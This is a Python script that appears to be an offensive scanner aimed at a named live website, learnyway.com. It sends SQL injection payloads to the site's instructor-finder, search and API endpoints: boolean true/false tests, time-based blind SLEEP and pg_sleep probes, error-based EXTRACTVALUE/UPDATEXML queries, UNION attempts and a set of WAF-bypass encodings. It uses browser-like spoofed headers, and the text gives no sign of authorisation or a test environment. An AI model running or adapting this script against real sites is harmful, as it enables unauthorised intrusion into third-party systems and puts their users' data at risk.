"""
LEARNYWAY.COM - DEEP SQL INJECTION ANALYSIS
============================================

Comprehensive scan for ALL SQLi vectors:
1. All parameters on /instructor-finder
2. Search endpoints
3. API endpoints
4. Time-based blind SQLi
5. Error-based SQLi
6. UNION-based
7. Different encodings and bypasses
"""

import requests
import time
import urllib.parse

BASE_URL = "https://learnyway.com"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Referer": f"{BASE_URL}/",
}

session = requests.Session()
session.headers.update(HEADERS)
session.timeout = 20

def safe_request(url, params=None, method="GET", data=None):
    """Safe request with error handling"""
    try:
        if method == "GET":
            r = session.get(url, params=params, timeout=20)
        else:
            r = session.post(url, data=data, timeout=20)
        return r
    except Exception as e:
        return None

# ============================================
# TECHNIQUE 1: SCAN ALL PARAMETERS
# ============================================

def scan_instructor_finder():
    """Scan all possible parameters on /instructor-finder"""
    print("\n" + "="*60)
    print("    SCANNING /instructor-finder ALL PARAMETERS")
    print("="*60)
    
    # All possible parameters from source code
    parameters = [
        "min_age",
        "max_age",
        "age",
        "min_rate",
        "max_rate",
        "rate",
        "sort",
        "category",
        "category_id",
        "search",
        "q",
        "query",
        "skill",
        "skill_id",
        "availability",
        "type",
        "page",
        "limit",
        "filter",
        "gender",
        "level",
        "price_min",
        "price_max",
    ]
    
    url = f"{BASE_URL}/instructor-finder"
    
    for param in parameters:
        # Test with TRUE and FALSE SQLi payloads
        true_payload = "1 AND 1=1"
        false_payload = "1 AND 1=2"
        
        r_true = safe_request(url, params={param: true_payload})
        time.sleep(0.5)
        r_false = safe_request(url, params={param: false_payload})
        
        if r_true and r_false:
            diff = len(r_true.text) - len(r_false.text)
            
            if abs(diff) > 1000:
                print(f"[!!!] SQLI on '{param}': TRUE={len(r_true.text)}, FALSE={len(r_false.text)}, DIFF={diff}")
            elif abs(diff) > 100:
                print(f"[+] Possible SQLI on '{param}': DIFF={diff}")
            else:
                print(f"[-] {param}: No difference ({len(r_true.text)} bytes)")
        else:
            print(f"[!] {param}: Request failed")
        
        time.sleep(0.3)

# ============================================
# TECHNIQUE 2: TIME-BASED BLIND SQLi
# ============================================

def test_time_based():
    """Test time-based blind SQLi"""
    print("\n" + "="*60)
    print("    TIME-BASED BLIND SQL INJECTION")
    print("="*60)
    
    url = f"{BASE_URL}/instructor-finder"
    
    parameters = ["min_age", "max_age", "sort", "category_id", "search"]
    
    time_payloads = [
        # MySQL
        ("1 AND SLEEP(3)", "MySQL SLEEP"),
        ("1 AND IF(1=1,SLEEP(3),0)", "MySQL IF SLEEP"),
        ("1 OR SLEEP(3)", "MySQL OR SLEEP"),
        ("1; SELECT SLEEP(3)", "Stacked SLEEP"),
        ("1 AND BENCHMARK(5000000,SHA1('test'))", "MySQL BENCHMARK"),
        
        # PostgreSQL
        ("1; SELECT pg_sleep(3)", "PostgreSQL pg_sleep"),
        
        # Universal
        ("1'||SLEEP(3)||'", "String concat SLEEP"),
    ]
    
    for param in parameters:
        print(f"\n[*] Testing parameter: {param}")
        
        for payload, desc in time_payloads:
            start = time.time()
            r = safe_request(url, params={param: payload})
            elapsed = time.time() - start
            
            if elapsed >= 3:
                print(f"    [!!!] {desc}: Took {elapsed:.1f}s - TIME-BASED SQLI!")
            elif elapsed >= 2:
                print(f"    [!] {desc}: Took {elapsed:.1f}s - Possible")

# ============================================
# TECHNIQUE 3: ERROR-BASED SQLi
# ============================================

def test_error_based():
    """Test error-based SQLi"""
    print("\n" + "="*60)
    print("    ERROR-BASED SQL INJECTION")
    print("="*60)
    
    url = f"{BASE_URL}/instructor-finder"
    
    error_payloads = [
        ("1'", "Single quote"),
        ('1"', "Double quote"),
        ("1`", "Backtick"),
        ("1\\", "Backslash"),
        ("1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))", "EXTRACTVALUE"),
        ("1 AND UPDATEXML(1,CONCAT(0x7e,version()),1)", "UPDATEXML"),
        ("1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)", "Double query"),
        ("1 AND EXP(~(SELECT * FROM (SELECT version())a))", "EXP overflow"),
    ]
    
    for payload, desc in error_payloads:
        r = safe_request(url, params={"min_age": payload})
        
        if r:
            # Check for SQL errors in response
            error_indicators = [
                "sql", "mysql", "syntax", "query", "error", "warning",
                "ORA-", "PG::", "SQLSTATE", "exception", "database"
            ]
            
            response_lower = r.text.lower()
            found_errors = [e for e in error_indicators if e.lower() in response_lower]
            
            if found_errors:
                print(f"[!!!] {desc}: Found error indicators: {found_errors}")
            elif r.status_code == 500:
                print(f"[!] {desc}: Server error (500)")
        
        time.sleep(0.3)

# ============================================
# TECHNIQUE 4: SCAN OTHER ENDPOINTS
# ============================================

def scan_other_endpoints():
    """Scan other potential SQLi endpoints"""
    print("\n" + "="*60)
    print("    SCANNING OTHER ENDPOINTS")
    print("="*60)
    
    endpoints = [
        ("/search", ["search", "q", "query", "keyword"]),
        ("/courses", ["category", "filter", "sort", "search"]),
        ("/webinars", ["category", "filter", "sort"]),
        ("/blog", ["category", "search", "tag"]),
        ("/instructors", ["search", "category", "skill"]),
        ("/categories", ["id", "parent"]),
        ("/api/courses", ["search", "category_id"]),
        ("/api/webinars", ["search", "category_id"]),
        ("/api/instructors", ["search", "min_age", "max_age"]),
    ]
    
    sqli_payload = "1' OR '1'='1"
    
    for endpoint, params in endpoints:
        url = f"{BASE_URL}{endpoint}"
        
        # First check if endpoint exists
        r_base = safe_request(url)
        
        if r_base and r_base.status_code == 200:
            print(f"\n[+] Endpoint found: {endpoint}")
            
            for param in params:
                r = safe_request(url, params={param: sqli_payload})
                
                if r:
                    if r.status_code == 500:
                        print(f"    [!] {param}: Server error - possible SQLi")
                    elif len(r.text) != len(r_base.text):
                        diff = len(r.text) - len(r_base.text)
                        if abs(diff) > 500:
                            print(f"    [!!!] {param}: Response differs by {diff} bytes")
                    
                time.sleep(0.3)
        else:
            print(f"[-] {endpoint}: Not found or blocked")

# ============================================
# TECHNIQUE 5: WAF BYPASS PAYLOADS
# ============================================

def test_waf_bypass():
    """Test SQLi with WAF bypass techniques"""
    print("\n" + "="*60)
    print("    WAF BYPASS SQL INJECTION")
    print("="*60)
    
    url = f"{BASE_URL}/instructor-finder"
    
    bypass_payloads = [
        # Case variation
        ("1 AnD 1=1", "Case variation AND"),
        ("1 aNd 1=2", "Case variation FALSE"),
        
        # Comment injection
        ("1/**/AND/**/1=1", "Comment bypass AND"),
        ("1/**/AND/**/1=2", "Comment bypass FALSE"),
        
        # URL encoding
        ("1%20AND%201=1", "URL encoded AND"),
        ("1%20AND%201=2", "URL encoded FALSE"),
        
        # Double URL encoding
        ("1%2520AND%25201=1", "Double encoded AND"),
        
        # Hex encoding
        ("1 AND 0x31=0x31", "Hex 1=1"),
        ("1 AND 0x31=0x32", "Hex 1=2"),
        
        # Unicode bypass
        ("1 ＡND 1=1", "Unicode AND"),
        
        # Null byte
        ("1%00AND 1=1", "Null byte"),
        
        # Tab/newline
        ("1\tAND\t1=1", "Tab separated"),
        ("1\nAND\n1=1", "Newline separated"),
        
        # Concatenation
        ("1 AND '1'='1'", "String comparison"),
        ("1 AND '1'='2'", "String FALSE"),
        
        # Mathematical
        ("1 AND 2>1", "Greater than TRUE"),
        ("1 AND 1>2", "Greater than FALSE"),
    ]
    
    baseline = safe_request(url, params={"min_age": "1"})
    baseline_len = len(baseline.text) if baseline else 0
    
    print(f"[*] Baseline length: {baseline_len}")
    
    for payload, desc in bypass_payloads:
        r = safe_request(url, params={"min_age": payload})
        
        if r:
            diff = len(r.text) - baseline_len
            
            if abs(diff) > 1000:
                print(f"[!!!] {desc}: Diff = {diff} bytes - BYPASS FOUND!")
            elif abs(diff) > 100:
                print(f"[+] {desc}: Diff = {diff} bytes - Possible")
        
        time.sleep(0.3)

# ============================================
# TECHNIQUE 6: JSON/API SQLi
# ============================================

def test_api_sqli():
    """Test SQLi on API endpoints with JSON"""
    print("\n" + "="*60)
    print("    API / JSON SQL INJECTION")
    print("="*60)
    
    api_endpoints = [
        "/api/v1/instructors",
        "/api/v1/courses",
        "/api/instructors",
        "/api/courses",
        "/api/search",
    ]
    
    json_payloads = [
        {"search": "1' OR '1'='1"},
        {"min_age": "1 AND 1=1"},
        {"category_id": "1 UNION SELECT 1"},
    ]
    
    for endpoint in api_endpoints:
        url = f"{BASE_URL}{endpoint}"
        
        for payload in json_payloads:
            try:
                headers = {"Content-Type": "application/json"}
                r = session.get(url, params=payload, headers=headers)
                
                if r.status_code not in [403, 404, 405]:
                    print(f"[+] {endpoint} with {list(payload.keys())[0]}: Status {r.status_code}, Len {len(r.text)}")
                    
            except:
                pass
            
            time.sleep(0.3)

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║       LEARNYWAY.COM - DEEP SQL INJECTION ANALYSIS            ║
║       Comprehensive Vulnerability Scan                        ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Test all techniques
    scan_instructor_finder()
    test_time_based()
    test_error_based()
    scan_other_endpoints()
    test_waf_bypass()
    test_api_sqli()
    
    print("\n" + "="*60)
    print("    DEEP ANALYSIS COMPLETE")
    print("="*60)

if __name__ == "__main__":
    main()
